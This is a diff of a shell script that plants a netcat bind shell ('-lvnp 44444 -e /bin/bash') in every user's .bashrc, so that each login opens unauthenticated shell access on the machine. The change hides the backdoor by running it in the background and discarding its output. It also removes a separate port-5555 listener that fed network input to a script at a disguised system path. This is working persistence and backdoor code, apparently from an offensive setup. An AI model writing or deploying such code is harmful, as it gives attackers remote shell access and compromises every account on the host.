@@ -14,11 +14,6 @@ for username in "${usernames[@]}"; do
     # Spawn reverse shell in each user's bash profile
     touch "/home/$username/.bashrc"
     ip=$(hostname -I | awk '{print $1}')
-    echo "nc.traditional -lvnp 44444 -e /bin/bash" &>> "/home/$username/.bashrc"
+    echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$username/.bashrc"
     chown "$username:$username" "/home/$username/.bashrc"
 done
-
-# Listen for messages and display them in terminals - start this in background
-nc.traditional -lvnp 5555 | while read line; do
-    /etc/System-Clock/chronos-broadcast.sh "$line"
-done &
